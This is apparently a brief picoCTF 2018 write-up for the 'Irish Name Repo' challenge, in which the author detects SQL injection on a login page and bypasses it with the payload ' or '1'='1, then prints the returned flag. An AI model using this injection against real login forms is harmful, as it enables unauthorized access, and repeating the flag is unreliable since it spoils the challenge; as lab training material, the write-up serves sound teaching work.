> Irish Name Repo - Points: 200 - (Solves: 414)
> There is a website running at http://2018shell1.picoctf.com:59464 (link). Do you think you can log us in? Try to see if you can login!

We use the sidebar to navigate to the login page.

Entering "'" in the username and attempting to login breaks the server request.

Therefore we can assume this is a SQL-injection challenge.

Putting in the details as follows returns the flag:
```
username: admin
password: ' or '1'='1
```

Text returned:
```
Logged in!
Your flag is: picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}
```

Flag: `picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}`
